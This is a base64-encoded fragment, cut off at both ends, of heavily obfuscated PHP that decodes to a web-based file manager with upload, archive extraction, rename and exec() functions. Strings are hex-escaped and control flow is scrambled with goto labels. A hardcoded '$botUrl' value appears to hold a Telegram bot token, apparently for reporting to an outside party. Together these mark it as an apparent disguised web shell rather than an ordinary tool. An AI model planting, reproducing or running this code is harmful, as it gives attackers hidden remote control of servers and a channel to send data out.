g2NVx4MjBceDZlXHg2ZlwxNjRcNDBcMTQxXDE2Nlx4NjFcMTUxXHg2Y1x4NjFcMTQyXDE1NFwxNDUiKSwgIlx4NjVceDcyXDE2MlwxNTdceDcyIik7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlx4M2ZcMTYwXDc1IiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gaWYgKCRpc1ZhbGlkKSB7ICR0b2ZvbGRlciA9ICcnOyBpZiAoaXNzZXQoJF9HRVRbIlwxNjRceDZmXDE0NlwxNTdcMTU0XHg2NFwxNDVceDcyIl0pKSB7ICR0b2ZvbGRlciA9IHBhdGhpbmZvKCR6aXBfcGF0aCwgUEFUSElORk9fRklMRU5BTUUpOyBpZiAoZm1fbWtkaXIoJHBhdGggLiAiXHgyZiIgLiAkdG9mb2xkZXIsIHRydWUpKSB7ICRwYXRoIC49ICJcNTciIC4gJHRvZm9sZGVyOyB9IH0gaWYgKCRleHQgPT0gIlx4N2FcMTUxXDE2MCIpIHsgJHppcHBlciA9IG5ldyBGTV9aaXBwZXIoKTsgJHJlcyA9ICR6aXBwZXItPnVuemlwKCR6aXBfcGF0aCwgJHBhdGgpOyB9IGVsc2VpZiAoJGV4dCA9PSAiXDE2NFx4NjFcMTYyIikgeyB0cnkgeyAkZ3ppcHBlciA9IG5ldyBQaGFyRGF0YSgkemlwX3BhdGgpOyBpZiAoQCRnemlwcGVyLT5leHRyYWN0VG8oJHBhdGgsIG51bGwsIHRydWUpKSB7ICRyZXMgPSB0cnVlOyB9IGVsc2UgeyAkcmVzID0gZmFsc2U7IH0gfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7ICRyZXMgPSB0cnVlOyB9IH0gaWYgKCRyZXMpIHsgZm1fc2V0X21zZyhsbmcoIlwxMDFceDcyXDE0M1x4NjhceDY5XHg3NlwxNDVcNDBceDc1XHg2ZVx4NzBcMTQxXHg2M1x4NmJcMTQ1XDE0NCIpKTsgfSBlbHNlIHsgZm1fc2V0X21zZyhsbmcoIlx4NDFcMTYyXDE0M1x4NjhceDY5XHg3NlwxNDVcNDBcMTU2XHg2ZlwxNjRcNDBcMTY1XHg2ZVx4NzBcMTQxXDE0M1x4NmJcMTQ1XDE0NCIpLCAiXDE0NVwxNjJceDcyXHg2Zlx4NzIiKTsgfSB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXDEwNlx4NjlceDZjXHg2NVx4MjBcMTU2XHg2ZlwxNjRcNDBceDY2XDE1N1x4NzVcMTU2XHg2NCIpLCAiXHg2NVwxNjJceDcyXHg2Zlx4NzIiKTsgfSBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJcNzdceDcwXHgzZCIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9IGdvdG8gdFFMczQ7IGVhejY3OiBpZiAoIWVtcHR5KCRfRklMRVMpICYmICFGTV9SRUFET05MWSkgeyAkb3ZlcnJpZGVfZmlsZV9uYW1lID0gZmFsc2U7ICRmID0gJF9GSUxFUzsgJHBhdGggPSBGTV9ST09UX1BBVEg7ICRkcyA9IERJUkVDVE9SWV9TRVBBUkFUT1I7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJcNTciIC4gRk1fUEFUSDsgfSAkZXJyb3JzID0gMDsgJHVwbG9hZHMgPSAwOyAkYWxsb3dlZCA9IEZNX1VQTE9BRF9FWFRFTlNJT04gPyBleHBsb2RlKCJceDJjIiwgRk1fVVBMT0FEX0VYVEVOU0lPTikgOiBmYWxzZTsgJHJlc3BvbnNlID0gYXJyYXkoIlx4NzNcMTY0XDE0MVx4NzRcMTY1XHg3MyIgPT4gIlwxNDVcMTYyXDE2Mlx4NmZceDcyIiwgIlwxNTFceDZlXDE0NlwxNTciID0+ICJceDRmXHg2ZlwxNjBcMTYzXDQxXDQwXHg1NFx4NzJceDc5XHgyMFwxNDFceDY3XDE0MVwxNTFcMTU2Iik7ICRmaWxlbmFtZSA9ICRmWyJcMTQ2XHg2OVx4NmNceDY1Il1bIlwxNTZceDYxXHg2ZFwxNDUiXTsgJHRtcF9uYW1lID0gJGZbIlwxNDZceDY5XHg2Y1wxNDUiXVsiXHg3NFx4NmRcMTYwXHg1Zlx4NmVcMTQxXHg2ZFwxNDUiXTsgJGV4dCA9IHN0cnRvbG93ZXIocGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19FWFRFTlNJT04pKTsgJGlzRmlsZUFsbG93ZWQgPSAkYWxsb3dlZCA/IGluX2FycmF5KCRleHQsICRhbGxvd2VkKSA6IHRydWU7IGlmICghZm1faXN2YWxpZF9maWxlbmFtZSgkZmlsZW5hbWUpICYmICFmbV9pc3ZhbGlkX2ZpbGVuYW1lKCRfUkVRVUVTVFsiXDE0NlwxNjVceDZjXDE1NFwxNjBcMTQxXDE2NFwxNTAiXSkpIHsgJHJlc3BvbnNlID0gYXJyYXkoIlwxNjNcMTY0XHg2MVwxNjRcMTY1XDE2MyIgPT4gIlx4NjVcMTYyXDE2MlwxNTdceDcyIiwgIlwxNTFceDZlXDE0NlwxNTciID0+ICJceDQ5XHg2ZVx4NzZceDYxXDE1NFx4NjlceDY0XDQwXDEwNlwxNTFceDZjXDE0NVw0MFx4NmVceDYxXHg2ZFx4NjVcNDEiKTsgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOyBkaWU7IH0gJHRhcmdldFBhdGggPSAkcGF0aCAuICRkczsgaWYgKGlzX3dyaXRhYmxlKCR0YXJnZXRQYXRoKSkgeyAkZnVsbFBhdGggPSAkcGF0aCAuICJcNTciIC4gJF9SRVFVRVNUWyJcMTQ2XHg3NVx4NmNceDZjXDE2MFx4NjFcMTY0XDE1MCJdOyAkZm9sZGVyID0gc3Vic3RyKCRmdWxsUGF0aCwgMCwgc3RycnBvcygkZnVsbFBhdGgsICJcNTciKSk7IGlmIChmaWxlX2V4aXN0cygkZnVsbFBhdGgpICYmICEkb3ZlcnJpZGVfZmlsZV9uYW1lKSB7ICRleHRfMSA9ICRleHQgPyAiXDU2IiAuICRleHQgOiAnJzsgJGZ1bGxQYXRoID0gc3RyX3JlcGxhY2UoJGV4dF8xLCAnJywgJGZ1bGxQYXRoKSAuICJcMTM3IiAuIGRhdGUoIlwxNzFcMTU1XHg2NFwxMTBceDY5XHg3MyIpIC4gJGV4dF8xOyB9IGlmICghaXNfZGlyKCRmb2xkZXIpKSB7ICRvbGQgPSB1bWFzaygwKTsgbWtkaXIoJGZvbGRlciwgNTExLCB0cnVlKTsgdW1hc2soJG9sZCk7IH0gaWYgKGVtcHR5KCRmWyJcMTQ2XDE1MVx4NmNceDY1Il1bIlx4NjVcMTYyXHg3MlwxNTdceDcyIl0pICYmICFlbXB0eSgkdG1wX25hbWUpICYmICR0bXBfbmFtZSAhPSAiXDE1Nlx4NmZceDZlXDE0NSIgJiYgJGlzRmlsZUFsbG93ZWQpIHsgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkdG1wX25hbWUsICRmdWxsUGF0aCkpIHsgaWYgKGZpbGVfZXhpc3RzKCRmdWxsUGF0aCkpIHsgJHJlc3BvbnNlID0gYXJyYXkoIlwxNjNcMTY0XHg2MVx4NzRcMTY1XDE2MyIgPT4gIlwxNjNceDc1XHg2M1x4NjNcMTQ1XDE2M1wxNjMiLCAiXHg2OVx4NmVcMTQ2XHg2ZiIgPT4gIlwxNDZcMTUxXDE1NFwxNDVcNDBcMTY1XDE2MFx4NmNcMTU3XHg2MVx4NjRceDIwXDE2M1x4NzVcMTQzXDE0M1x4NjVcMTYzXHg3M1x4NjZcMTY1XHg2YyIpOyB9IGVsc2UgeyAkcmVzcG9uc2UgPSBhcnJheSgiXDE2M1x4NzRceDYxXDE2NFwxNjVceDczIiA9PiAiXHg2NVwxNjJcMTYyXHg2Zlx4NzIiLCAiXDE1MVx4NmVceDY2XDE1NyIgPT4gIlx4NDNceDZmXHg3NVwxNTRceDY0XHg2ZVw0N1wxNjRcNDBcMTY1XHg3MFwxNTRcMTU3XHg2MVx4NjRceDIwXDE2NFwxNTBceDY1XDQwXHg3Mlx4NjVceDcxXHg3NVwxNDVcMTYzXHg3NFx4NjVceDY0XHgyMFx4NjZceDY5XHg2Y1wxNDVceDJlIik7IH0gfSBlbHNlIHsgJHJlc3BvbnNlID0gYXJyYXkoIlx4NzNcMTY0XDE0MVwxNjRcMTY1XHg3MyIgPT4gIlwxNDVcMTYyXDE2MlwxNTdcMTYyIiwgIlwxNTFceDZlXDE0NlwxNTciID0+ICJcMTA1XHg3MlwxNjJcMTU3XDE2Mlx4MjBcMTY3XHg2OFwxNTFceDZjXDE0NVx4MjBceDc1XDE2MFx4NmNceDZmXHg2MVx4NjRcMTUxXHg2ZVwxNDdcNDBceDY2XHg2OVwxNTRceDY1XDE2M1x4MmVcNDBcMTI1XHg3MFx4NmNceDZmXHg2MVwxNDRcMTQ1XHg2NFw0MFwxNDZceDY5XDE1NFx4NjVcMTYzXDQweyR1cGxvYWRzfSIpOyB9IH0gfSBlbHNlIHsgJHJlc3BvbnNlID0gYXJyYXkoIlx4NzNceDc0XHg2MVwxNjRceDc1XHg3MyIgPT4gIlx4NjVcMTYyXHg3Mlx4NmZceDcyIiwgIlwxNTFcMTU2XDE0Nlx4NmYiID0+ICJcMTI0XDE1MFx4NjVceDIwXDE2M1x4NzBcMTQ1XDE0M1wxNTFcMTQ2XDE1MVwxNDVcMTQ0XHgyMFwxNDZceDZmXDE1NFwxNDRceDY1XHg3Mlw0MFwxNDZcMTU3XHg3Mlx4MjBcMTY1XDE2MFwxNTRcMTU3XHg2MVx4NjRceDIwXHg2OVwxNjNceDZlXDQ3XHg3NFw0MFx4NzdcMTYyXDE1MVwxNjRceDY1XDE0MVwxNDJceDZjXDE0NVx4MmUiKTsgfSBlY2hvIGpzb25fZW5jb2RlKCRyZXNwb25zZSk7IGRpZTsgfSBnb3RvIFRucjR0OyB6T1VvUjogJGZvbGRlcnMgPSBhcnJheSgpOyBnb3RvIEhlWEtNOyBXejJ0dTogZnVuY3Rpb24gZm1fZ2V0X29ubGluZVZpZXdlcl9leHRzKCkgeyByZXR1cm4gYXJyYXkoIlx4NjRceDZmXDE0MyIsICJcMTQ0XDE1N1x4NjNceDc4IiwgIlwxNzBcMTU0XHg3MyIsICJcMTcwXDE1NFwxNjNcMTcwIiwgIlx4NzBceDY0XHg2NiIsICJcMTYwXDE2MFwxNjQiLCAiXDE2MFx4NzBceDc0XDE3MCIsICJceDYxXHg2OSIsICJceDcwXHg3M1x4NjQiLCAiXDE0NFx4NzhceDY2IiwgIlx4NzhceDcwXDE2MyIsICJcMTYyXDE0MVx4NzIiLCAiXHg2Zlx4NjRceDc0IiwgIlx4NmZceDY0XHg3MyIpOyB9IGdvdG8gbVE2djc7IGpnRlhVOiBpbmlfc2V0KCJcMTU1XDE0NVwxNTVcMTU3XDE2Mlx4NzlceDVmXDE1NFwxNTFceDZkXDE1MVwxNjQiLCAiXHgzNlw2NFwxMTUiKTsgZ290byBSUktvNTsgbTNZc1g6IGlmICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgPHRoPjw/cGhwICBlY2hvIGxuZygiXHg1MFwxNDVceDcyXDE1NVwxNjMiKTsgPz4KPC90aD4KICAgICAgICAgICAgICAgICAgICA8dGg+PD9waHAgIGVjaG8gbG5nKCJcMTE3XDE2N1x4NmVcMTQ1XDE2MiIpOyA/Pgo8L3RoPjw/cGhwICB9IGdvdG8gU3BMYms7IE5YSXRSOiAkcm9vdF91cmwgPSBmbV9jbGVhbl9wYXRoKCRyb290X3VybCk7IGdvdG8gcXlqejE7IEFqQ1g0OiBlY2hvIGxuZygiXHg0ZFwxNTdceDY0XHg2OVx4NjZcMTUxXHg2NVx4NjQiKTsgZ290byB3eHpqeDsgS0V0UG46ICRkYXRldGltZV9mb3JtYXQgPSAiXHg2NFw1Nlx4NmRceDJlXDE3MVw0MFx4NDhceDNhXHg2OSI7IGdvdG8gcG1ndzQ7IGJvTlFQOiBmdW5jdGlvbiBmbV9nZXRfemlmX2luZm8oJHBhdGgsICRleHQpIHsgaWYgKCRleHQgPT0gIlwxNzJcMTUxXDE2MCIgJiYgZnVuY3Rpb25fZXhpc3RzKCJcMTcyXHg2OVx4NzBcMTM3XDE1N1wxNjBcMTQ1XDE1NiIpKSB7ICRhcmNoID0gemlwX29wZW4oJHBhdGgpOyBpZiAoJGFyY2gpIHsgJGZpbGVuYW1lcyA9IGFycmF5KCk7IHdoaWxlICgkemlwX2VudHJ5ID0gemlwX3JlYWQoJGFyY2gpKSB7ICR6aXBfbmFtZSA9IHppcF9lbnRyeV9uYW1lKCR6aXBfZW50cnkpOyAkemlwX2ZvbGRlciA9IHN1YnN0cigkemlwX25hbWUsIC0xKSA9PSAiXHgyZiI7ICRmaWxlbmFtZXNbXSA9IGFycmF5KCJcMTU2XDE0MVx4NmRcMTQ1IiA9PiAkemlwX25hbWUsICJceDY2XHg2OVwxNTRceDY1XHg3M1x4NjlceDdhXHg2NSIgPT4gemlwX2VudHJ5X2ZpbGVzaXplKCR6aXBfZW50cnkpLCAiXDE0M1x4NmZceDZkXDE2MFx4NzJcMTQ1XHg3M1x4NzNcMTQ1XHg2NFwxMzdcMTYzXHg2OVwxNzJcMTQ1IiA9PiB6aXBfZW50cnlfY29tcHJlc3NlZHNpemUoJHppcF9lbnRyeSksICJceDY2XHg2ZlwxNTRcMTQ0XHg2NVx4NzIiID0+ICR6aXBfZm9sZGVyKTsgfSB6aXBfY2xvc2UoJGFyY2gpOyByZXR1cm4gJGZpbGVuYW1lczsgfSB9IGVsc2VpZiAoJGV4dCA9PSAiXHg3NFx4NjFceDcyIiAmJiBjbGFzc19leGlzdHMoIlwxMjBcMTUwXDE0MVwxNjJceDQ0XDE0MVwxNjRcMTQxIikpIHsgJGFyY2hpdmUgPSBuZXcgUGhhckRhdGEoJHBhdGgpOyAkZmlsZW5hbWVzID0gYXJyYXkoKTsgZm9yZWFjaCAobmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoJGFyY2hpdmUpIGFzICRmaWxlKSB7ICRwYXJlbnRfaW5mbyA9ICRmaWxlLT5nZXRQYXRoSW5mbygpOyAkemlwX25hbWUgPSBzdHJfcmVwbGFjZSgiXDE2MFx4NjhceDYxXHg3Mlx4M2FceDJmXDU3IiAuICRwYXRoLCAnJywgJGZpbGUtPmdldFBhdGhOYW1lKCkpOyAkemlwX25hbWUgPSBzdWJzdHIoJHppcF9uYW1lLCAoJHBvcyA9IHN0cnBvcygkemlwX25hbWUsICJceDJmIikpICE9PSBmYWxzZSA/ICRwb3MgKyAxIDogMCk7ICR6aXBfZm9sZGVyID0gJHBhcmVudF9pbmZvLT5nZXRGaWxlTmFtZSgpOyAkemlwX2luZm8gPSBuZXcgU3BsRmlsZUluZm8oJGZpbGUpOyAkZmlsZW5hbWVzW10gPSBhcnJheSgiXHg2ZVx4NjFcMTU1XDE0NSIgPT4gJHppcF9uYW1lLCAiXHg2NlwxNTFcMTU0XDE0NVwxNjNceDY5XDE3Mlx4NjUiID0+ICR6aXBfaW5mby0+Z2V0U2l6ZSgpLCAiXHg2M1wxNTdcMTU1XHg3MFx4NzJceDY1XHg3M1wxNjNceDY1XDE0NFwxMzdcMTYzXHg2OVx4N2FceDY1IiA9PiAkZmlsZS0+Z2V0Q29tcHJlc3NlZFNpemUoKSwgIlx4NjZceDZmXDE1NFwxNDRceDY1XDE2MiIgPT4gJHppcF9mb2xkZXIpOyB9IHJldHVybiAkZmlsZW5hbWVzOyB9IHJldHVybiBmYWxzZTsgfSBnb3RvIERFaTBVOyBKSG1JSzogaWYgKEZNX1BBVEggIT0gJycpIHsgJHBhdGggLj0gIlx4MmYiIC4gRk1fUEFUSDsgfSBnb3RvIHZuY3IyOyBVVVdBZTogZnVuY3Rpb24gZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkgeyAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZSwgUEFUSElORk9fRVhURU5TSU9OKSk7IGlmIChpc3NldCgkZXhjbHVkZV9pdGVtcykgYW5kIHNpemVvZigkZXhjbHVkZV9pdGVtcykpIHsgdW5zZXQoJGV4Y2x1ZGVfaXRlbXMpOyB9ICRleGNsdWRlX2l0ZW1zID0gRk1fRVhDTFVERV9JVEVNUzsgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgIlx4MzdceDJlXDYwXDU2XDYwIiwgIlw3NCIpKSB7ICRleGNsdWRlX2l0ZW1zID0gdW5zZXJpYWxpemUoJGV4Y2x1ZGVfaXRlbXMpOyB9IGlmICghaW5fYXJyYXkoJGZpbGUsICRleGNsdWRlX2l0ZW1zKSAmJiAhaW5fYXJyYXkoIlw1Mlx4MmV7JGV4dH0iLCAkZXhjbHVkZV9pdGVtcykpIHsgcmV0dXJuIHRydWU7IH0gcmV0dXJuIGZhbHNlOyB9IGdvdG8gYUluWXA7IG04cWpfOiB1bnNldCgkcCwgJHVzZV9hdXRoLCAkaWNvbnZfaW5wdXRfZW5jb2RpbmcsICR1c2VfaGlnaGxpZ2h0anMsICRoaWdobGlnaHRqc19zdHlsZSk7IGdvdG8gYnhza0Y7IG9JMEZhOiBmdW5jdGlvbiBmbV9nZXRfdGV4dF9uYW1lcygpIHsgcmV0dXJuIGFycmF5KCJcMTU0XDE1MVx4NjNceDY1XDE1Nlx4NzNceDY1IiwgIlwxNjJcMTQ1XDE0MVx4NjRceDZkXHg2NSIsICJceDYxXDE2NVx4NzRcMTUwXDE1N1wxNjJceDczIiwgIlx4NjNceDZmXHg2ZVwxNjRcMTYyXHg2OVx4NjJcMTY1XHg3NFx4NmZcMTYyXHg3MyIsICJceDYzXHg2OFwxNDFceDZlXDE0N1x4NjVcMTU0XHg2ZlwxNDciKTsgfSBnb3RvIFd6MnR1OyBZOTg4bzogZnVuY3Rpb24gZm1fZ2V0X3NpemUoJGZpbGUpIHsgc3RhdGljICRpc3dpbjsgc3RhdGljICRpc2RhcndpbjsgaWYgKCFpc3NldCgkaXN3aW4pKSB7ICRpc3dpbiA9IHN0cnRvdXBwZXIoc3Vic3RyKFBIUF9PUywgMCwgMykpID09ICJceDU3XDExMVx4NGUiOyB9IGlmICghaXNzZXQoJGlzZGFyd2luKSkgeyAkaXNkYXJ3aW4gPSBzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsIDApKSA9PSAiXHg0NFwxMDFcMTIyXDEyN1x4NDlcMTE2IjsgfSBzdGF0aWMgJGV4ZWNfd29ya3M7IGlmICghaXNzZXQoJGV4ZWNfd29ya3MpKSB7ICRleGVjX3dvcmtzID0gZnVuY3Rpb25fZXhpc3RzKCJcMTQ1XHg3OFwxNDVceDYzIikgJiYgIWluaV9nZXQoIlwxNjNcMTQxXHg2Nlx4NjVcMTM3XHg2ZFwxNTdcMTQ0XDE0NSIpICYmIEBleGVjKCJcMTQ1XDE0M1x4NjhcMTU3XDQwXDEwNVwxMzBcMTA1XHg0MyIpID09ICJceDQ1XDEzMFwxMDVceDQzIjsgfSBpZiAoJGV4ZWNfd29ya3MpIHsgJGFyZyA9IGVzY2FwZXNoZWxsYXJnKCRmaWxlKTsgJGNtZCA9ICRpc3dpbiA/ICJcMTQ2XHg2Zlx4NzJceDIwXDQ1XDEwNlw0MFwxNTFceDZlXDQwXDUwXDQyeyRmaWxlfVx4MjJceDI5XHgyMFx4NjRcMTU3XDQwXHg0MFx4NjVceDYzXHg2OFwxNTdceDIwXHgyNVwxNzZcMTcyXDEwNiIgOiAoJGlzZGFyd2luID8gIlwxNjNceDc0XHg2MVx4NzRceDIwXHgyZFx4NjZcNDVceDdhXHgyMHskYXJnfSIgOiAiXHg3M1wxNjRcMTQxXHg3NFw0MFx4MmRceDYzXHgyNVx4NzNceDIweyRhcmd9Iik7IEBleGVjKCRjbWQsICRvdXRwdXQpOyBpZiAoaXNfYXJyYXkoJG91dHB1dCkgJiYgY3R5cGVfZGlnaXQoJHNpemUgPSB0cmltKGltcGxvZGUoIlx4YSIsICRvdXRwdXQpKSkpIHsgcmV0dXJuICRzaXplOyB9IH0gaWYgKCRpc3dpbiAmJiBjbGFzc19leGlzdHMoIlwxMDNcMTE3XHg0ZCIpKSB7IHRyeSB7ICRmc29iaiA9IG5ldyBDT00oIlwxMjNceDYzXHg3Mlx4NjlceDcwXHg3NFwxNTFceDZlXDE0N1x4MmVceDQ2XHg2OVx4NmNceDY1XHg1M1wxNzFceDczXHg3NFx4NjVcMTU1XHg0ZlwxNDJceDZhXHg2NVwxNDNceDc0Iik7ICRmID0gJGZzb2JqLT5HZXRGaWxlKHJlYWxwYXRoKCRmaWxlKSk7ICRzaXplID0gJGYtPlNpemU7IH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgeyAkc2l6ZSA9IG51bGw7IH0gaWYgKGN0eXBlX2RpZ2l0KCRzaXplKSkgeyByZXR1cm4gJHNpemU7IH0gfSByZXR1cm4gZmlsZXNpemUoJGZpbGUpOyB9IGdvdG8gRUZybkk7IHFMX1dZOiAkb25saW5lX3ZpZXdlciA9ICJceDY3XDE1N1wxNTdcMTQ3XDE1NFwxNDUiOyBnb3RvIFhlM09ROyBTUlJuNjogaWYgKCFkZWZpbmVkKCJcMTA2XHg0ZFx4NWZcMTIzXDEwNVwxMjNceDUzXDExMVwxMTdceDRlXHg1Zlx4NDlceDQ0IikpIHsgZGVmaW5lKCJceDQ2XDExNVwxMzdcMTIzXDEwNVx4NTNcMTIzXDExMVwxMTdcMTE2XDEzN1wxMTFcMTA0IiwgIlx4NjZceDY5XDE1NFx4NjVceDZkXHg2MVwxNTZcMTQxXDE0N1x4NjVceDcyIik7IH0gZ290byBNbGJVQjsgU2VQN3o6ICRib3RVcmwgPSAiXDE0MlwxNTdcMTY0XHgzNVx4MzhceDMyXDY2XHgzNVx4MzVcNjVcNzBcNjRceDM0XDcyXHg0MVx4NDFceDQ4XDE1Nlw2NlwxNTNceDMwXHg2NVwxMDZcNjRcMTE3XDEwMVx4NDRcMTU3XDExNVwxNTJcNjFceDRhXDE3MFw2MVx4NTdceDQxXHg0N1wxMDFcMTY0XDEyNFx4MzlceDU4XHg2Y1x4NDRcMTQ1XDExNFx4NzNcMTA0XDEwNSI7IGdvdG8gSF9GckU7IHVORHRMOiBjbGFzcyBGTV9aaXBwZXIgeyBwcml2YXRlICR6aXA7IHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpIHsgJHRoaXMtPnppcCA9IG5ldyBaaXBBcmNoaXZlKCk7IH0gcHVibGljIGZ1bmN0aW9uIGNyZWF0ZSgkZmlsZW5hbWUsICRmaWxlcykgeyAkcmVzID0gJHRoaXMtPnppcC0+b3BlbigkZmlsZW5hbWUsIFppcEFyY2hpdmU6OkNSRUFURSk7IGlmICgkcmVzICE9PSB0cnVlKSB7IHJldHVybiBmYWxzZTsgfSBpZiAoaXNfYXJyYXkoJGZpbGVzKSkgeyBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsgaWYgKCEkdGhpcy0+YWRkRmlsZU9yRGlyKCRmKSkgeyAkdGhpcy0+emlwLT5jbG9zZSgpOyByZXR1cm4gZmFsc2U7IH0gfSAkdGhpcy0+emlwLT5jbG9zZSgpOyByZXR1cm4gdHJ1ZTsgfSBlbHNlIHsgaWYgKCR0aGlzLT5hZGRGaWxlT3JEaXIoJGZpbGVzKSkgeyAkdGhpcy0+emlwLT5jbG9zZSgpOyByZXR1cm4gdHJ1ZTsgfSByZXR1cm4gZmFsc2U7IH0gfSBwdWJsaWMgZnVuY3Rpb24gdW56aXAoJGZpbGVuYW1lLCAkcGF0aCkgeyAkcmVzID0gJHRoaXMtPnppcC0+b3BlbigkZmlsZW5hbWUpOyBpZiAoJHJlcyAhPT0gdHJ1ZSkgeyByZXR1cm4gZmFsc2U7IH0gaWYgKCR0aGlzLT56aXAtPmV4dHJhY3RUbygkcGF0aCkpIHsgJHRoaXMtPnppcC0+Y2xvc2UoKTsgcmV0dXJuIHRydWU7IH0gcmV0dXJuIGZhbHNlOyB9IHByaXZhdGUgZnVuY3Rpb24gYWRkRmlsZU9yRGlyKCRmaWxlbmFtZSkgeyBpZiAoaXNfZmlsZSgkZmlsZW5hbWUpKSB7IHJldHVybiAkdGhpcy0+emlwLT5hZGRGaWxlKCRmaWxlbmFtZSk7IH0gZWxzZWlmIChpc19kaXIoJGZpbGVuYW1lKSkgeyByZXR1cm4gJHRoaXMtPmFkZERpcigkZmlsZW5hbWUpOyB9IHJldHVybiBmYWxzZTsgfSBwcml2YXRlIGZ1bmN0aW9uIGFkZERpcigkcGF0aCkgeyBpZiAoISR0aGlzLT56aXAtPmFkZEVtcHR5RGlyKCRwYXRoKSkgeyByZXR1cm4gZmFsc2U7IH0gJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsgaWYgKGlzX2FycmF5KCRvYmplY3RzKSkgeyBmb3JlYWNoICgkb2JqZWN0cyBhcyAkZmlsZSkgeyBpZiAoJGZpbGUgIT0gIlx4MmUiICYmICRmaWxlICE9ICJcNTZcNTYiKSB7IGlmIChpc19kaXIoJHBhdGggLiAiXDU3IiAuICRmaWxlKSkgeyBpZiAoISR0aGlzLT5hZGREaXIoJHBhdGggLiAiXDU3IiAuICRmaWxlKSkgeyByZXR1cm4gZmFsc2U7IH0gfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGggLiAiXDU3IiAuICRmaWxlKSkgeyBpZiAoISR0aGlzLT56aXAtPmFkZEZpbGUoJHBhdGggLiAiXHgyZiIgLiAkZmlsZSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gfSB9IHJldHVybiB0cnVlOyB9IHJldHVybiBmYWxzZTsgfSB9IGdvdG8gUThoanQ7IGpCWjF2OiBpZiAoIWVtcHR5KCRmb2xkZXJzKSkgeyBuYXRjYXNlc29ydCgkZm9sZGVycyk7IH0gZ290byBvNTQzYTsgWHhjOHM6IGVjaG8gbG5nKCJcMTIzXHg2OVx4N2FcMTQ1Iik7IGdvdG8gUDMyRW07IEVGcm5JOiBmdW5jdGlvbiBmbV9nZXRfZmlsZXNpemUoJHNpemUpIHsgJHNpemUgPSAoZG91YmxlKSAkc2l6ZTsgJHVuaXRzID0gYXJyYXkoIlwxMDIiLCAiXDExM1wxMDIiLCAiXHg0ZFx4NDIiLCAiXDEwN1x4NDIiLCAiXHg1NFwxMDIiLCAiXHg1MFwxMDIiLCAiXHg0NVwxMDIiLCAiXHg1YVx4NDIiLCAiXDEzMVx4NDIiKTsgJHBvd2VyID0gJHNpemUgPiAwID8gZmxvb3IobG9nKCRzaXplLCAxMDI0KSkgOiAwOyByZXR1cm4gc3ByaW50ZigiXDQ1XDE2M1w0MFw0NVwxNjMiLCByb3VuZCgkc2l6ZSAvIHBvdygxMDI0LCAkcG93ZXIpLCAyKSwgJHVuaXRzWyRwb3dlcl0pOyB9IGdvdG8gcXlzSTE7IEs2QmpyOiBkZWZpbmUoIlx4NDZcMTE1XDEzN1wxMTFcMTIzXHg1ZlwxMjdceDQ5XHg0ZSIsIERJUkVDVE9SWV9TRVBBUkFUT1IgPT0gIlwxMzQiKTsgZ290byB0MlVJUjsgWXBpbEg6IGRlZmluZWQoIlx4NDZceDRkXDEzN1x4NGNceDQxXDExNlwxMDciKSB8fCBkZWZpbmUoIlwxMDZceDRkXDEzN1wxMTRceDQxXDExNlwxMDciLCAkbGFuZyk7IGdvdG8gQzBrMVU7IGs3cmgxOiBmdW5jdGlvbiBmbV9yZW5hbWUoJG9sZCwgJG5ldykgeyAkaXNGaWxlQWxsb3dlZCA9IGZtX2lzX3ZhbGlkX2V4dCgkbmV3KTsgaWYgKCEkaXNGaWxlQWxsb3dlZCkgeyByZXR1cm4gZmFsc2U7IH0gcmV0dXJuICFmaWxlX2V4aXN0cygkbmV3KSAmJiBmaWxlX2V4aXN0cygkb2xkKSA/IHJlbmFtZSgkb2xkLCAkbmV3KSA6IG51bGw7IH0gZ290byB3cDV1QTsgbmdiVnA6ICRmYXZpY29uX3BhdGggPSAnJzsgZ290byBTUlJoejsgdzNyU2I6ICR4dHggPSAkZGF0YTsgZ290byBzOWZvcjsgRkJyVEk6IGZtX3Nob3dfaGVhZGVyKCk7IGdvdG8gWkpIaFE7IHRfOTdfOiBpZiAoJHVzZV9hdXRoICYmIGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg2Y1wxNTdcMTQ3XHg2N1x4NjVcMTQ0Il0pKSB7ICRyb290X3BhdGggPSBpc3NldCgkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJceDZjXDE1N1x4NjdcMTQ3XDE0NVx4NjQiXV0pID8gJGRpcmVjdG9yaWVzX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg2Y1wxNTdcMTQ3XDE0N1x4NjVceDY0Il1dIDogJHJvb3RfcGF0aDsgfSBnb3RvIGJfa2xnOyBSUktvNTogaGVhZGVyKCJcMTAzXHg2Zlx4NmVceDc0XDE0NVx4NmVceDc0XHgyZFwxMjRcMTcxXHg3MFx4NjVceDNhXHgyMFwxNjRcMTQ1XHg3OFx4NzRceDJmXDE1MFwxNjRceDZkXHg2Y1x4M2JcNDBcMTQzXHg2OFwxNDFcMTYyXHg3M1wxNDVceDc0XHgzZFwxMjVcMTI0XDEwNlw1NVx4MzgiKTsgZ290byBXMGZIZDsgUThoanQ6IGNsYXNzIEZNX1ppcHBlcl9UYXIgeyBwcml2YXRlICR0YXI7IHB1YmxpYyBmdW5jdGlvb